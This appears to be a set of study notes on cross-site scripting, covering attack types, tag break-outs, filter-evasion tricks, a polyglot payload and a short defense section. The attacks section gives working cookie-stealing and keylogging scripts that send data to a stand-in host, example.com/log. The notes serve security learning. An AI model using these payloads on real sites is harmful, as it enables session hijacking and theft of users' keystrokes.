# XSS (Cross-Site Scripting) Attacks

Types of XSS attacks:

* Reflected (URL-based, no server-side storage)
* Stored
* DOM-based (really client-side)

DOM-based attacks are *client* side - with both reflected and stored XSS, the server is embedding the attack into the page that's being rendered. For DOM-based attacks, it's the *client* that inserts the malicious JavaScript into the page (even if the data was provided by the server). Ask yourself: "How did this get into the page? Did the server put it there (reflected/stored XSS), or did my client put it there (DOM-based XSS)?"

The canonical (but highly annoying) XSS PoC is:

```html
<script>alert('XSS');</script>
```

A much less annoying XSS test is to manipulate the `innerHTML` of page elements:

```html
<script>
	xssTest
		= document.querySelector("h1");
	xssTest.innerHTML = "XSS was here!";
</script>
```

* [Document.querySelector()](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector)

## Tips for Writing JavaScript

JavaScript accepts back-ticks as a type of quotation mark, so we actually have three different marks to work with (single quote, double quote, and back-tick).

Sometimes you'll need to break out of a tag that you're being inserted into. Various options:

* Use `">` if you're being inserted into an HTML attribute.
* Use `</pre>` or `</textarea>` for preformatted blocks and text areas.
* Use `';` followed by `;//` for direct JavaScript inserts. (Note that it's only possible to insert `<script/>` tags if the JavaScript you're abusing is being included from a file, as HTML parsers are greedy about the closing `</script>` tag.)

Most regular expressions and filters are only executed in a single pass. Thus, a regular expression that's filtering out `<script>` and `</script>` tags can be circumvented by using `<s<script>cript>` and `</s</script>cript>`. That said, this trick doesn't work for regular expressions that are removing single characters (for example, `<` and `>`).

You can also use the `onload` attribute to pull in JavaScript, though note that this is only functional the first time the page is loaded. This will often require you to close out the preceding attribute (`"`) and *leave off* the trialing `"` of the `onload` attribute in order for everything to work properly.

There's also "polygot" strings which work in a variety of contexts. These have some pretty wild escaping going on; for example, the following (lightly modified from TryHackMe's example) produces an "XSS" alert:

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert('XSS')//>>
```

## Filter Evasion

### Bypass Simple Word Filtering

In general, you can break up strings to get around this.

```javascript
alert("H" + "ello")
```

The `eval()` function can be used to turn strings into function names if a function is filtered.

```javascript
eval("a" + "lert")("Hello")
```

It's also possible (and safer, though if we're breaking into things we probably care a lot less about safety) to use `window[]`.

```javascript
window["a" + "lert"]("Hello")
```

For really heavy filtering, use something nutso like JSFuck.

(Note that things like the JavaScript Obfuscator Tool won't always remove functions and strings, as they tend to be geared more towards thwarting script analysis than bypassing filters.)

Sometimes filters are applied in a case-sensitive fashion. While JavaScript *is* case-sensitive, URL schemes, HTML tag names, and HTML tag attributes are case-*insensitive* (so, `javascript:` is treated the same as `javaSCRIPT:`, `onclick` is treated the same as `ONCLICK`, etc.).

* [JSFuck](http://www.jsfuck.com/)
* [JavaScript Obfuscator Tool](https://obfuscator.io/)

### Using iFrames and Images

Typically XSS attacks work by injecting `<script/>` tags, but it's also possible to inject JavaScript using the `<iframe/>` and `<img/>` tags by setting the `src` attribute to the `javacript:` pseudo-protocol. For example:

```html
<!-- iframe injection -->
<iframe src="javascript:alert('XSS');"/>

<!-- img injection -->
<img src="javascript:alert('XSS');"/>
```

Note, however, that JavaScript loaded in an `<iframe/>` won't have access to the parent page's DOM.

### Fallbacks Requiring User Interaction

Finally, `javascript:` URIs can also be included in anchor(`<a/>`) `href` attributes, as well as `onmouseover` and `onclick` attributes (which can be attached to almost any HTML tag). Getting these attacks to fire requires a user to interact with the modified tag, however.

## Attacks

### Accessing Browser Cookies

```html
<script>
	fetch(
		'https://example.com/log'
			+ '?cookie='
			+ btoa(document.cookie)
	);
</script>
```

### Keylogging

```html
<script>
	document.onkeypress = function(e) {
		fetch(
			'https://example.com/log'
				+ '?cookie='
				+ btoa(document.cookie)
				+ '&keypress='
				+ btoa(e.key)
		);
	}
</script>
```

Adding the user's session cookie here allows us to tell whose keystrokes are whose!

* [Document.cookie](https://developer.mozilla.org/docs/Web/API/Document/cookie)

### Port Scanning

[An example JavaScript port scanner (possibly broken).](https://github.com/aabeling/portscan)

### Website Defacement

You can access elements of the DOM using `document.getElementById("element-id")` or `document.querySelector("#element-id")`. The `querySelector()` method is a bit more flexible (you can use CSS-style selectors here) and should probably be preferred.

To get/set the content of an element, use the `innerHTML` method (to insert HTML directly into the DOM), or alternately `innerText` or `textContent` to set element text *only*.

Note that `<script/>` tags inserted by setting an element's `innerHTML` are *not* executed, however!

## Defense

The key to defending against XSS is really to get your encoding right. User-generated code that's passed off to JavaScript needs to be JavaScript-escaped first. User-generated code that's written into the DOM needs to be HTML-escaped first. Know what the context is of your data, and escape/unescape appropriately when writing data from one context to another!
